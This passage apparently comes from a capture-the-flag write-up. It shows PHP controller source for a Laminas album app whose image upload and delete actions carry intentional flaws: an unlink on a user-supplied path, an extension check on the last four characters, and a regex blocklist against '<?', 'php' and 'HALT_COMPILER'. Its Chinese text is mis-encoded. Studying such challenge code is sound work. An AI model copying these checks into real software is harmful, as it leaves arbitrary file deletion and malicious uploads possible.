        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">indexAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ViewModel</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'albums'</span> <span class="token operator">=&gt;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">addAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AlbumForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Add'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$album</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Album</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setInputFilter</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token operator">-&gt;</span><span class="token function">getInputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$album</span><span class="token operator">-&gt;</span><span class="token function">exchangeArray</span><span class="token punctuation">(</span><span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">saveAlbum</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">editAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">params</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">fromRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'add'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Retrieve the album with the specified id. Doing so raises</span>
        <span class="token comment">// an exception if the album is not found, which should result</span>
        <span class="token comment">// in redirecting to the landing page.</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token variable">$album</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">getAlbum</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AlbumForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Edit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span> <span class="token operator">=&gt;</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$viewData</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setInputFilter</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token operator">-&gt;</span><span class="token function">getInputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$viewData</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">saveAlbum</span><span class="token punctuation">(</span><span class="token variable">$album</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Redirect to album list</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">deleteAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">params</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">fromRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$del</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'del'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'No'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$del</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'Yes'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">deleteAlbum</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// Redirect to list of albums</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toRoute</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'album'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'id'</span>    <span class="token operator">=&gt;</span> <span class="token variable">$id</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'album'</span> <span class="token operator">=&gt;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token operator">-&gt;</span><span class="token function">getAlbum</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imgdeleteAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$imgpath</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">//ç™½åå•</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img File Can Be Deleted!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imguploadAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UploadForm</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload-form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// Make certain to merge the $_FILES info!</span>
            <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token function">array_merge_recursive</span><span class="token punctuation">(</span>
                <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment">//ç™½åå•é™åˆ¶</span>
                    <span class="token variable">$cont</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$cont</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not This"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"The picture size must be more than 3kb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/public/img/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$base</span><span class="token punctuation">;</span>
                    <span class="token keyword">echo</span> <span class="token variable">$img_path</span><span class="token punctuation">;</span>
                    <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">saveImg</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img Can Be Uploaded!'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token comment">// Form is valid, save the form!</span>
                <span class="token comment">//return $this-&gt;redirect()-&gt;toRoute('upload-form/success');</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imguploadAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$form</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UploadForm</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload-form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Make certain to merge the $_FILES info!</span>
        <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token function">array_merge_recursive</span><span class="token punctuation">(</span>
            <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment">//ç™½åå•é™åˆ¶</span>
                <span class="token variable">$cont</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$cont</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not This"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"The picture size must be more than 3kb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
